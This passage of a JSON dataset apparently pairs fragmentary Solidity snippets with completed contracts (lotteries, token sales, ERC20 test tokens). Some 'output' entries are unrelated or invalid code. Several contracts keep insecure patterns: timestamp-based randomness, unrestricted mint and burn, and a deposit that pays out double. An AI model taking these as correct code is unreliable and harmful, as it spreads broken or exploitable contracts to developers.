        "input": "pragma solidity ^0.8.7;\n\nstruct UserInfo{\n   uint id ;\n   string ime;\n}\n\ninterface IContract1{    \n    function arr(uint index) external returns(UserInfo memory );\n}\n\ncontract Contract2{\n    event UserEVENT (UserInfo UserInfo);\n    UserInfo [] public newarr;\n\n    function foo(address addr,uint i) external {\n        IContract1(addr).arr(i);\n        emit UserEVENT (IContract1(addr).arr(i));\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.7;\n\nstruct UserInfo{\n   uint id ;\n   string ime;\n}\n\ninterface IContract1{    \n    function arr(uint index) external returns(UserInfo memory );\n}\n\ncontract Contract2{\n    event UserEVENT (UserInfo UserInfo);\n    UserInfo [] public newarr;\n\n    function foo(address addr,uint i) external {\n        IContract1(addr).arr(i);\n        emit UserEVENT (IContract1(addr).arr(i));\n    }\n}\n\n"
    },
    "423.sol": {
        "input": "function getdrugs(string memory _name) public view returns (Drug[] memory) {\n  Drug[] memory drugsToReturn = new Drug[](_getCount(_name));\n  uint256 index = 0;\n\n  for(uint i=0;i<counter;i++) {\n      if (keccak256(abi.encodePacked((drugs[i].name))) == keccak256(abi.encodePacked((_name)))){\n        drugsToReturn[index] = drugs[i];\n        index++;\n      }\n  }\n    \n  return drugsToReturn;\n}\n\nfunction _getCount(string memory _name) private view returns (uint256) {\n  uint256 count = 0;\n\n  for(uint i=0;i<counter;i++) {\n      if (keccak256(abi.encodePacked((drugs[i].name))) == keccak256(abi.encodePacked((_name)))){\n          count++;\n      }\n  }\n\n  return count;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract DrugContract {\n    struct Drug {\n        string name;\n        // add other properties of the drug\n    }\n\n    Drug[] public drugs;\n    uint256 public counter;\n\n    function getdrugs(string memory _name) public view returns (Drug[] memory) {\n        Drug[] memory drugsToReturn = new Drug[](_getCount(_name));\n        uint256 index = 0;\n\n        for(uint i=0; i<counter; i++) {\n            if (keccak256(abi.encodePacked((drugs[i].name))) == keccak256(abi.encodePacked((_name)))){\n                drugsToReturn[index] = drugs[i];\n                index++;\n            }\n        }\n        \n        return drugsToReturn;\n    }\n\n    function _getCount(string memory _name) private view returns (uint256) {\n        uint256 count = 0;\n\n        for(uint i=0; i<counter; i++) {\n            if (keccak256(abi.encodePacked((drugs[i].name))) == keccak256(abi.encodePacked((_name)))){\n                count++;\n            }\n        }\n\n        return count;\n    }\n}\n"
    },
    "424.sol": {
        "input": "function getCandidateInfo(uint _candidateId) public view returns (uint, \nstring memory, string memory) {\n\n    Candidate memory candidate=candidatesMap[_candidateId]\n    return(\n        candidate.candidateId,\n        candidate.CandidateName,\n        candidate.party\n    );\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ninterface CandidateInterface {\n\n    function getCandidateInfo(uint _candidateId) public view returns (uint, \n    string memory, string memory);\n\n    \n}\n\n"
    },
    "426.sol": {
        "input": "if (msg.sender != owner()) {\n        if (whitelisted[msg.sender] != true) {\n            if (presaleWallets[msg.sender] != true) {\n                require(msg.value >= cost * _mintAmount);\n            } else {\n                require(msg.value >= presaleCost * _mintAmount);\n            }\n        }\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TokenSale {\n    address private _owner;\n    uint256 private _cost;\n    uint256 private _presaleCost;\n\n    mapping(address => bool) public whitelisted;\n    mapping(address => bool) public presaleWallets;\n    \n    constructor (uint256 cost, uint256 presaleCost) {\n        _owner = msg.sender;\n        _cost = cost;\n        _presaleCost = presaleCost;\n    }\n\n    function buyTokens(uint256 _mintAmount) public payable {\n        if (msg.sender != _owner) {\n            if (!whitelisted[msg.sender]) {\n                if (!presaleWallets[msg.sender]) {\n                    require(msg.value >= _cost * _mintAmount, \"Insufficient funds sent\");\n                } else {\n                    require(msg.value >= _presaleCost * _mintAmount, \"Insufficient presale funds sent\");\n                }\n            }\n        }\n        // Continue the function to handle token transfer...\n    }\n\n    function owner() public view returns (address) {\n        return _owner;\n    }\n}\n\n"
    },
    "427.sol": {
        "input": "pragma solidity ^0.8.16;\n \nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/IERC721.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol\";\n \ncontract MyVault is IERC721Receiver {\n    IERC20 immutable public erc20Token;\n    IERC721 immutable public erc721Collection;\n\n    uint256 constant public AMOUNT_OF_ERC20_PER_ERC721 = 1 * 1e18; \n\n    constructor(IERC20 _erc20Token, IERC721 _erc721Collection) {\n        erc20Token = _erc20Token;\n        erc721Collection = _erc721Collection;\n    }\n\n    function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes calldata _data) external returns(bytes4) {\n\n        bool success = erc20Token.transfer(_operator, AMOUNT_OF_ERC20_PER_ERC721);\n        require(success);\n\n        return this.onERC721Received.selector;\n    }\n\n    function erc20toErc721() external {\n        bool success = erc20Token.transferFrom(msg.sender, address(this), AMOUNT_OF_ERC20_PER_ERC721);\n        require(success);\n\n        uint256 tokenId = 1;\n\n        erc721Collection.safeTransferFrom(address(this), msg.sender, tokenId);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function transfer(address to, uint256 value) external;\n}\n\ninterface IERC721 {\n    function safeTransferFrom(address from, address to, uint256 tokenId) external;\n}\n\ninterface IERC721Receiver {\n    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4);\n}\n\n"
    },
    "428.sol": {
        "input": "    console.logBytes4(bytes4(keccak256(bytes(\"foo2(uint256)\")))); \n    console.logBytes(abi.encodeWithSignature(\"foo2(uint256)\")); \n    console.logBytes4(Token2.foo2.selector); \n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Token2 {\n    function foo2(uint256 _foo) public pure returns (uint256 ret) {\n        return _foo * 2;\n    }\n}\n\n"
    },
    "429.sol": {
        "input": "function _transfer(address sender, address recipient, uint256 amount) internal virtual override {\n    require(!_isBlackList[from] && !_isBlackList[to],\"You are black listed by Owner\");\n    super._transfer(sender, recipient, amount);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract BlackList {\n  mapping(address => bool) public _isBlackList;\n  \n  address private _owner;\n  address owner;\n  \n  modifier onlyOwner() {\n    require(msg.sender == owner, \"You are not the owner\");\n    _;\n  }\n\n  \n  constructor(address owner) {\n    _owner = owner;\n  }\n\n  \n  \n  function addBlackList(address toAdd) public onlyOwner {\n    _isBlackList[toAdd] = true;\n  }\n\n  \n  \n  function removeBlackList(address toRemove) public onlyOwner {\n    require(_isBlackList[toRemove], \"Token is not black listed\");\n    _isBlackList[toRemove] = false;\n  }\n\n   \n  \n   function isBlackListed(address toCheck) public view returns (bool) {\n     return _isBlackList[toCheck];\n     }\n}\n\n"
    },
    "430.sol": {
        "input": "pragma solidity ^0.8.19;\n\ncontract sendMonetSolidity {\n    receive() external payable {\n    }\n\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract sendMonetSolidity {\n    receive() external payable {\n    }\n\n}\n\n"
    },
    "431.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyNFTContract {\n    function transferToken() external payable {\n        require(msg.value == this.getPrice(), \"Incorrect value\");\n    }\n\n    function getPrice() external pure returns (uint256) {\n        return 0.5 ether;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyNFTContract {\n    function transferToken() external payable {\n        require(msg.value == this.getPrice(), \"Incorrect value\");\n        // ... \n    }\n\n    function getPrice() external pure returns (uint256) {\n        // can by also dynamic based on the token ID or any other on-chain param\n        return 0.5 ether;\n    }\n}\n\n"
    },
    "432.sol": {
        "input": "mapping(address => mapping(uint256 => string)) tokenURIs;\n\nmapping(address => string[]) tokenURIsByAddress;\n\n\n",
        "output": "pragma solidity ^0.8.9;\nabstract contract Response {\n\n\n\n\n\n\n\n\n\n\n\nmapping(address => mapping(uint256 => string))\npublic tokenURIs;\n\nmapping(address => string[])\npublic tokenURIsByAddress;\n\n\n\n\n\n}\n\n"
    },
    "435.sol": {
        "input": "contract lotteryProject\n{\naddress public  owner;\naddress public addressofwinner;   \n\naddress payable []  public  part;\nreceive() external payable virtual {}\nuint value;\nconstructor()\n{\n    owner=msg.sender;\n}\n\nfunction depositEthers() public payable{\n    require( msg.value==10 ether , \" 2Ethers are required to participate in this lottery: \");\n    part.push(payable(msg.sender));\n}\n\nfunction totalDeposits()public view returns(uint)\n{   \n    require (msg.sender== owner, \"Only owner is \n        authorized to chech the total deposits\");\n    return address(this).balance;\n}\n\nfunction random()public view returns (uint) \n{\n    require(msg.sender==owner);\n    return uint(keccak256(abi.encodePacked(block.prevrandao,\n         block.timestamp , part.length)));\n\n}\n\nfunction winner()public\n{\n    require(msg.sender==owner);\n    require(part.length>=3);\n\n    uint r = random();\n     \n    uint index = r % part.length;\n    address payable  won ;\n    won= part[index]; \n    addressofwinner=won;              \n    won.transfer(totalDeposits());\n    part= new address payable[](0);   \n     } \n   }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract lotteryProject {\n    address public owner;\n    address public addressofwinner;\n    address payable[] public part;\n    uint public value;\n    \n    receive() external payable {}\n    \n    constructor() {\n        owner = msg.sender;\n    }\n    \n    function depositEthers() public payable {\n        require(msg.value == 10 ether, \"2 ethers are required to participate in this lottery.\");\n        part.push(payable(msg.sender));\n    }\n    \n    function totalDeposits() public view returns(uint) {\n        require(msg.sender == owner, \"Only owner is authorized to check the total deposits.\");\n        return address(this).balance;\n    }\n    \n    function random() public view returns (uint) {\n        require(msg.sender == owner, \"Only owner is authorized to generate random number.\");\n        return uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp, part.length)));\n    }\n    \n    function winner() public {\n        require(msg.sender == owner, \"Only owner is authorized to select winner.\");\n        require(part.length >= 3, \"At least 3 participants are required to select a winner.\");\n        \n        uint r = random();\n        uint index = r % part.length;\n        \n        address payable won = part[index];\n        addressofwinner = won;\n        \n        won.transfer(totalDeposits());\n        part = new address payable[](0);\n    }\n}\n"
    },
    "436.sol": {
        "input": "    address constant public BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;\n\nIERC20 public immutable BUSD =\n    IERC20(0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n\n    function getDecimals() external view returns (uint256 decimals);\n\n}\n\n"
    },
    "437.sol": {
        "input": "struct NFT {\n    string contractAddress;\n    uint256 tokenID;\n    string tokenStandard;\n    string blockChain;\n    uint256 creatorFees;\n}\n\nNFT nftOne = NFT(\"0xD9D24a4b8A58BCdBfDDd0d27B51F27\", 345,\"ERC-721\", \"ETHEREUM\", 721);\nNFT nftTwo = NFT(\"0xD9824a4b8A5u8CdBfDDd0d27B51F27\", 346,\"ERC-721\", \"ETHEREUM\", 721);\nNFT nftThree = NFT(\"0xD9DE9824a4b8A58BCdBfDDd0Y1F27\", 347,\"ERC-721\", \"ETHEREUM\", 721);\n\nNFT[] nftArray;\n\nconstructor() {\n    nftArray.push(nftOne);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract nft_array {\n    struct NFT {\n        string contractAddress;\n        uint256 tokenID;\n        string tokenStandard;\n        string blockChain;\n        uint256 creatorFees;\n    }\n\n    NFT nftOne = NFT(\"0xD9D24a4b8A58BCdBfDDd0d27B51F27\", 345,\"ERC-721\", \"ETHEREUM\", 721);\n    NFT nftTwo = NFT(\"0xD9824a4b8A5u8CdBfDDd0d27B51F27\", 346,\"ERC-721\", \"ETHEREUM\", 721);\n    NFT nftThree = NFT(\"0xD9DE9824a4b8A58BCdBfDDd0Y1F27\", 347,\"ERC-721\", \"ETHEREUM\", 721);\n\n    NFT[] nftArray;\n\n    constructor() {\n        nftArray.push(nftOne);\n        nftArray.push(nftTwo);\n        nftArray.push(nftThree);\n    }\n\n\n}\n\n"
    },
    "438.sol": {
        "input": "pragma solidity >=0.7.0 <0.9.0;\n\ncontract MappingInFunction {\n    mapping (uint => string) public Names;\n    uint public counter;\n   \n    function addToMappingInsideFunction(string memory name) public returns (string memory localName)  {\n        mapping (uint => string) storage localNames = Names;\n        counter+=1;\n        localNames[counter] = name;\n        return localNames[counter];\n\n}\n\n}\n\n\n",
        "output": "// SPDX-License-Identifier: GPL-3.0\npragma solidity >=0.7.0 <0.9.0;\n\ncontract MappingInFunction {\n    mapping (uint => string) public Names;\n    uint public counter;\n   \n    function addToMappingInsideFunction(string memory name) public returns (string memory localName)  {\n        mapping (uint => string) storage localNames = Names;\n        counter+=1;\n        localNames[counter] = name;\n        return localNames[counter];\n\n        // we cannot return mapping in solidity\n        // return localNames;\n}\n\n}\n\n"
    },
    "439.sol": {
        "input": "function readAllTask() public view returns (Task[] memory) {\n    return tasks;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TaskContract {\n    struct Task {\n        string name;\n        string description;\n        uint256 timestamp;\n    }\n    \n    Task[] public tasks;\n    \n    function readAllTask() public view returns (Task[] memory) {\n        return tasks;\n    }\n}\n"
    },
    "443.sol": {
        "input": "contract RemoveByIndex {\n   uint[] public payees = [1, 2, 3, 4, 5];\n    function removeByIndex(uint index) public returns(uint[] memory){\n        uint lastPayeeIndex=payees.length-1;\n        uint lastPayeeId=payees[lastPayeeIndex];\n        payees[index]=lastPayeeId;\n        payees.pop();\n         return payees ;\n    }\n}\n\n [1, 5, 3, 4, 5]\n\n [1, 5, 3, 4]\n\ncontract RemoveByIndex {\n   uint[] public payees = [1, 2, 3, 4, 5];\n   mapping (uint=>uint) public idToIndex; \n   function populateMapping() public {\n        idToIndex[1]=0;\n        idToIndex[2]=1;\n        idToIndex[3]=2;\n        idToIndex[4]=3;\n        idToIndex[5]=4;\n    }\n    function removeByIndex(uint index) public returns(uint[] memory){\n        uint lastPayeeIndex=payees.length-1;\n        uint lastPayeeId=payees[lastPayeeIndex];\n        uint idToBeRemoved=payees[index];\n        payees[index]=lastPayeeId;\n        idToIndex[lastPayeeId]=index;\n        delete idToIndex[idToBeRemoved];\n        payees.pop();\n        return payees ;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract RemoveByIndex {\n   uint[] public payees = [1, 2, 3, 4, 5];\n   mapping (uint=>uint) public idToIndex; \n   function populateMapping() public {\n        idToIndex[1]=0;\n        idToIndex[2]=1;\n        idToIndex[3]=2;\n        idToIndex[4]=3;\n        idToIndex[5]=4;\n    }\n    function removeByIndex(uint index) public returns(uint[] memory){\n        uint lastPayeeIndex=payees.length-1;\n        uint lastPayeeId=payees[lastPayeeIndex];\n        uint idToBeRemoved=payees[index];\n        payees[index]=lastPayeeId;\n        idToIndex[lastPayeeId]=index;\n        delete idToIndex[idToBeRemoved];\n        payees.pop();\n        return payees;\n    }\n}\n\n"
    },
    "444.sol": {
        "input": "pragma solidity ^0.4.18; \n\ncontract lottery{\n    uint public lastTicketNumber = 0;\n    uint youEntredWithAmount;\n    address [] public players;\n    uint public entryFee =  0.01 ether;\n    \n    struct UserInfo {\n        uint userFstTcktNumber;\n        uint userLstTcktNumber;\n    }\n    \n    mapping(address => UserInfo ) public entry;\n    \n    function letsdo(uint first, uint last) public{\n        players.push(msg.sender);\n        entry[msg.sender].userFstTcktNumber = first;\n        entry[msg.sender].userLstTcktNumber = last;\n    }\n    \n    function currentLevel(address userAddress) public constant returns (uint, uint) {\n        return (entry[userAddress].userFstTcktNumber, entry[userAddress].userLstTcktNumber);\n    }\n    \n \n      \n      function numberOfParticipents() public view returns(address [] memory){\n          return players;\n      }\n}\n\n\n\n",
        "output": "pragma solidity ^0.4.18; \n\ncontract lottery{\n    uint public lastTicketNumber = 0;\n    uint youEntredWithAmount;\n    address [] public players;\n    uint public entryFee =  0.01 ether;\n    \n    struct UserInfo {\n        uint userFstTcktNumber;\n        uint userLstTcktNumber;\n    }\n    \n    mapping(address => UserInfo ) public entry;\n    \n    function letsdo(uint first, uint last) public{\n        players.push(msg.sender);\n        entry[msg.sender].userFstTcktNumber = first;\n        entry[msg.sender].userLstTcktNumber = last;\n    }\n    \n    function currentLevel(address userAddress) public constant returns (uint, uint) {\n        return (entry[userAddress].userFstTcktNumber, entry[userAddress].userLstTcktNumber);\n    }\n    \n \n      \n      function numberOfParticipents() public view returns(address [] memory){\n          return players;\n      }\n}\n\n\n"
    },
    "445.sol": {
        "input": "pragma solidity ^0.8.0;\n\nimport \"hardhat/console.sol\";\n\ncontract ContractA {\n    event Received(address sender, uint value);\n\n    receive() external payable {\n        emit Received(msg.sender, msg.value);\n    }\n\n    function deposit() public payable{\n        require(msg.value >= 0, \"Value amount to be deposit\");\n        withdraw(msg.value);\n    }\n\n    function withdraw(uint256 _amount) internal{\n        console.log(_amount);\n        uint256 amount = 2 * _amount; \n        console.log(amount);\n        payable(msg.sender).transfer(amount);\n    }\n}\n\nimport { ethers } from \"hardhat\";\n\nconst hre = require(\"hardhat\");\nasync function main() {\n  const [owner] = await hre.ethers.getSigners();\n\n  const deposit = await ethers.getContractFactory(\"ContractA\");\n  const depositInstance = await deposit.deploy();\n  await depositInstance.deployed();\n\n  const depositContract = await hre.ethers.getContractFactory(\"ContractA\");\n  const instance = await depositContract.attach(`${depositInstance.address}`);\n\n  const contractBalance = await hre.ethers.provider.getBalance(\n    `${depositInstance.address}`\n  );\n  console.log(\"contract balance before tx\", contractBalance.toString());\n\n  await owner.sendTransaction({\n    to: depositInstance.address,\n    value: ethers.utils.parseUnits(\"100\", 18),\n  });\n  const contractBalanceAfter = await hre.ethers.provider.getBalance(\n    `${depositInstance.address}`\n  );\n  console.log(\"contract balance after tx\", contractBalanceAfter.toString());\n\n  const ownerBalance = await hre.ethers.provider.getBalance(`${owner.address}`);\n  console.log(\n    `Owner balance before deposit ${ethers.utils.formatUnits(\n      ownerBalance.toString(),\n      18\n    )}`\n  );\n  await instance\n    .connect(owner)\n    .deposit({ value: ethers.utils.parseUnits(\"5\", 18) });\n\n  const contractBalanceAfterContract = await hre.ethers.provider.getBalance(\n    `${depositInstance.address}`\n  );\n  console.log(\n    \"contract after contract interaction\",\n    contractBalanceAfterContract.toString()\n  );\n\n  const ownerBalanceAfter = await hre.ethers.provider.getBalance(\n    `${owner.address}`\n  );\n  console.log(\n    `Owner balance before deposit ${ethers.utils.formatUnits(\n      ownerBalanceAfter.toString(),\n      18\n    )}`\n  );\n}\nmain().catch((error) => {\n  console.error(error);\n  process.exitCode = 1;\n});\n\nCompiled 1 Solidity file successfully\ncontract balance before tx 0\ncontract balance after tx 100000000000000000000\nOwner balance before deposit 9899.999469435601476844\n5000000000000000000\n10000000000000000000\ncontract after contract interaction 95000000000000000000\nOwner balance before deposit 9904.999416266040763879\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ContractA {\n    event Received(address sender, uint value);\n\n    receive() external payable {\n        emit Received(msg.sender, msg.value);\n    }\n\n    function deposit() public payable{\n        require(msg.value >= 0, \"Value amount to be deposit\");\n        withdraw(msg.value);\n    }\n\n    function withdraw(uint256 _amount) internal{\n        uint256 amount = 2 * _amount; \n        payable(msg.sender).transfer(amount);\n    }\n}\n\n"
    },
    "446.sol": {
        "input": "contract MyContract is ERC20, Ownable {\n\n   function myFunction() public {\n      ...\n   }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface ERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ninterface Ownable {\n    function transferOwnership(address newOwner) external;\n}\n\n"
    },
    "447.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    uint256[] numbers;\n\n    constructor() {\n        numbers.push(123);\n        numbers.push(456);\n    }\n\n    function getNumbers() public view returns (uint256[] memory) {\n        return numbers;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    uint256[] numbers;\n\n    constructor() {\n        numbers.push(123);\n        numbers.push(456);\n    }\n\n    function getNumbers() public view returns (uint256[] memory) {\n        return numbers;\n    }\n}\n\n"
    },
    "449.sol": {
        "input": "Player storage newestplayer = players[len-1];\n\n\n",
        "output": "pragma solidity ^0.8.9;\nlibrary SafeMath {\n    function add(uint a, uint b) internal pure returns (uint) {\n        return a + b;\n    }\n    function sub(uint a, uint b) internal pure returns (uint) {\n        return a - b;\n    }\n    function mul(uint a, uint b) internal pure returns (uint) {\n        return a * b;\n    }\n    function div(uint a, uint b) internal pure returns (uint) {\n        return a / b;\n    }\n    \n}\n\n"
    },
    "450.sol": {
        "input": "payable(address(this)).transfer(msg.value);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SimplePayment {\n    receive() external payable {\n        payable(address(this)).transfer(msg.value);\n    }\n}\n\n"
    },
    "451.sol": {
        "input": "The fallback function is executed on a call to the contract if none of the other functions match the given function signature, or if no data was supplied at all and there is no receive Ether function. The fallback function always receives data, but in order to also receive Ether it must be marked payable.\n\n\nfunction setStorageValue(uint256 storageValue) public\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SafeStorage {\n\n    function setStorageValue(uint256 storageValue) public payable {\n        storage_[block.timestamp] = storageValue;\n    }\n\n    mapping(uint256=>uint256) storage_;\n\n}\n\n"
    },
    "452.sol": {
        "input": "pragma solidity 0.8.16 ;\n contract arr\n {     uint256[4] public n ;\n       uint256 x = 0 ;\n\n  function pl(uint256 a ) public\n    {\n      n[x] = a ;\n      x++ ;\n     }\n }\n\npragma solidity 0.8.16 ;\n contract arr\n {     uint256[] public n ;\n       uint256 x = 0 ;\n\n  function pl(uint256 a ) public\n    {\n      n.push();\n      n[x] = a ;\n      x++ ;\n     }\n }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract arr {\n    uint256[5] public n ;\n       uint256 x = 0 ;\n\n  \n  function pl(uint256 a ) public\n    {\n      n[x] = a ;\n      x++ ;\n     }\n }\n\n"
    },
    "453.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    receive() external payable {}\n\n    function withdraw() external {\n        payable(address(0x123)).transfer(address(this).balance);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    receive() external payable {}\n\n    function withdraw() external {\n        // transfer this contract's whole BNB balance to the `0x123` address\n        payable(address(0x123)).transfer(address(this).balance);\n    }\n}\n\n"
    },
    "454.sol": {
        "input": "ERC20 public token;\n\nAggregatorV3Interface internal priceFeed; \n\nfunction registerAsset(string memory description, uint256 price, uint256 shares) external onlyOwner {\n    require(shares > 0, \"Shares must be greater than 0.\");\n    assetCount++;\n    assets[assetCount] = Asset(msg.sender, description, price, shares);\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ninterface IERC20 {\n  function totalSupply() external view returns (uint256);\n\n  function balanceOf(address account) external view returns (uint256);\n\n  function transfer(address recipient, uint256 amount) external returns (bool);\n\n  event Transfer(address indexed from, address indexed to, uint256 value);\n}\n\ninterface AggregatorV3Interface {\n  function latestRoundData() external view returns (uint256, uint256, uint256);\n}\n\ncontract Asset {\n  string internal description;\n  uint256 internal price;\n  uint256 internal shares;\n\n  function Asset(address owner, string memory _description, uint256 _price, uint256 _shares)\n    public {\n    price = _price;\n    shares = _shares;\n    description = _description;\n  }\n}\n\n"
    },
    "455.sol": {
        "input": "function shuffle() internal {\n    for (uint256 i = 0; i < dogs.length; i++) {\n        uint256 n = uint256(keccak256(abi.encodePacked(randomNo))) % (numberArr.length - i) + i;\n\n        String memory temp = dogs[n];\n        dogs[n] = dogs[i];\n        dogs[i] = temp;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract DogShuffler {\n    string[] public dogs;\n    uint256 private randomNo;\n    \n    constructor(string[] memory _dogs) {\n        dogs = _dogs;\n        randomNo = uint256(keccak256(abi.encodePacked(block.timestamp)));\n    }\n    \n    function shuffle() internal {\n        for (uint256 i = 0; i < dogs.length; i++) {\n            uint256 n = uint256(keccak256(abi.encodePacked(randomNo))) % (dogs.length - i) + i;\n    \n            string memory temp = dogs[n];\n            dogs[n] = dogs[i];\n            dogs[i] = temp;\n        }\n    }\n    \n    // Add other contract functions or events here if needed\n}\n"
    },
    "457.sol": {
        "input": "modifier compPurch() {\n}\n\nmodifier realBuyerOrTimeBought() {\n    require(msg.sender == buyer || block.timestamp >= time + 5);\n}\n\nfunction foo() public compPurch realBuyerOrTimeBought {\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\n       interface ICurve {\n              \n              \n              function foo() external virtual ;\n\n       }\n\n"
    },
    "458.sol": {
        "input": "\npragma solidity ^0.8.7;\n\nlibrary Math {\n    function safeAdd(uint256 x, uint256 y) internal pure returns (uint256) {\n        uint256 z = x + y;\n        require(z >= x, \"math-add-overflow\");\n        return z;\n    }\n    function safeSub(uint256 x, uint256 y) internal pure returns (uint256) {\n        uint256 z = x - y;\n        require(z <= x, \"math-sub-underflow\");\n        return z;\n    }\n}\n\ncontract TestERC20 {\n\n    uint256 public constant decimals = 18;\n    string public name;\n    string public symbol;\n    uint256 public totalSupply;\n\n    mapping (address => uint256) public balances;\n    mapping (address => mapping (address => uint256)) private allowances;\n\n    event Approval(address indexed src, address indexed usr, uint256 wad);\n    event Transfer(address indexed src, address indexed dst, uint256 wad);\n\n    function getChainId() public view returns(uint256) {\n        uint256 chainId;\n        assembly {\n            chainId := chainid()\n        }\n        return chainId;\n    }\n\n    constructor(string memory _symbol, string memory _name) {\n        symbol = _symbol;\n        name = _name;\n    }\n\n    function transfer(address dst, uint256 wad) external returns (bool) {\n        return transferFrom(msg.sender, dst, wad);\n    }\n\n    function transferFrom(address src, address dst, uint256 wad) public returns (bool) {\n        require(balances[src] >= wad, \"nsufficient-balance\");\n        if (src != msg.sender && allowances[src][msg.sender] != type(uint256).max) {\n            require(allowances[src][msg.sender] >= wad, \"insufficient-allowances\");\n            allowances[src][msg.sender] = Math.safeSub(allowances[src][msg.sender], wad);\n        }\n        balances[src] = Math.safeSub(balances[src], wad);\n        balances[dst] = Math.safeAdd(balances[dst], wad);\n        emit Transfer(src, dst, wad);\n        return true;\n    }\n\n    function mint(address usr, uint256 wad) public {\n        balances[usr] = Math.safeAdd(balances[usr], wad);\n        totalSupply = Math.safeAdd(totalSupply, wad);\n        emit Transfer(address(0), usr, wad);\n    }\n\n    function burn(address usr, uint256 wad) public {\n        require(balances[usr] >= wad, \"insufficient-balance\");\n        if (usr != msg.sender && allowances[usr][msg.sender] != type(uint256).max) {\n            require(allowances[usr][msg.sender] >= wad, \"insufficient-allowances\");\n            allowances[usr][msg.sender] = Math.safeSub(allowances[usr][msg.sender], wad);\n        }\n        balances[usr] = Math.safeSub(balances[usr], wad);\n        totalSupply    = Math.safeSub(totalSupply, wad);\n        emit Transfer(usr, address(0), wad);\n    }\n\n    function approve(address usr, uint256 wad) external returns (bool) {\n        allowances[msg.sender][usr] = wad;\n        emit Approval(msg.sender, usr, wad);\n        return true;\n    }\n\n    function allowance(address owner, address spender) public view returns (uint256) {\n        return allowances[owner][spender];\n    }\n\n    function balanceOf(address account) public view returns (uint256) {\n        return balances[account];\n    }\n\n}\n\n\n",
        "output": "// SPDX-License-Identifier: GPL-3.0\n\npragma solidity ^0.8.7;\n\nlibrary Math {\n    function safeAdd(uint256 x, uint256 y) internal pure returns (uint256) {\n        uint256 z = x + y;\n        require(z >= x, \"math-add-overflow\");\n        return z;\n    }\n    function safeSub(uint256 x, uint256 y) internal pure returns (uint256) {\n        uint256 z = x - y;\n        require(z <= x, \"math-sub-underflow\");\n        return z;\n    }\n}\n\ncontract TestERC20 {\n\n    uint256 public constant decimals = 18;\n    string public name;\n    string public symbol;\n    uint256 public totalSupply;\n\n    mapping (address => uint256) public balances;\n    mapping (address => mapping (address => uint256)) private allowances;\n\n    event Approval(address indexed src, address indexed usr, uint256 wad);\n    event Transfer(address indexed src, address indexed dst, uint256 wad);\n\n    function getChainId() public view returns(uint256) {\n        uint256 chainId;\n        assembly {\n            chainId := chainid()\n        }\n        return chainId;\n    }\n\n    constructor(string memory _symbol, string memory _name) {\n        symbol = _symbol;\n        name = _name;\n    }\n\n    function transfer(address dst, uint256 wad) external returns (bool) {\n        return transferFrom(msg.sender, dst, wad);\n    }\n\n    function transferFrom(address src, address dst, uint256 wad) public returns (bool) {\n        require(balances[src] >= wad, \"nsufficient-balance\");\n        if (src != msg.sender && allowances[src][msg.sender] != type(uint256).max) {\n            require(allowances[src][msg.sender] >= wad, \"insufficient-allowances\");\n            allowances[src][msg.sender] = Math.safeSub(allowances[src][msg.sender], wad);\n        }\n        balances[src] = Math.safeSub(balances[src], wad);\n        balances[dst] = Math.safeAdd(balances[dst], wad);\n        emit Transfer(src, dst, wad);\n        return true;\n    }\n\n    function mint(address usr, uint256 wad) public {\n        balances[usr] = Math.safeAdd(balances[usr], wad);\n        totalSupply = Math.safeAdd(totalSupply, wad);\n        emit Transfer(address(0), usr, wad);\n    }\n\n    function burn(address usr, uint256 wad) public {\n        require(balances[usr] >= wad, \"insufficient-balance\");\n        if (usr != msg.sender && allowances[usr][msg.sender] != type(uint256).max) {\n            require(allowances[usr][msg.sender] >= wad, \"insufficient-allowances\");\n            allowances[usr][msg.sender] = Math.safeSub(allowances[usr][msg.sender], wad);\n        }\n        balances[usr] = Math.safeSub(balances[usr], wad);\n        totalSupply    = Math.safeSub(totalSupply, wad);\n        emit Transfer(usr, address(0), wad);\n    }\n\n    function approve(address usr, uint256 wad) external returns (bool) {\n        allowances[msg.sender][usr] = wad;\n        emit Approval(msg.sender, usr, wad);\n        return true;\n    }\n\n    function allowance(address owner, 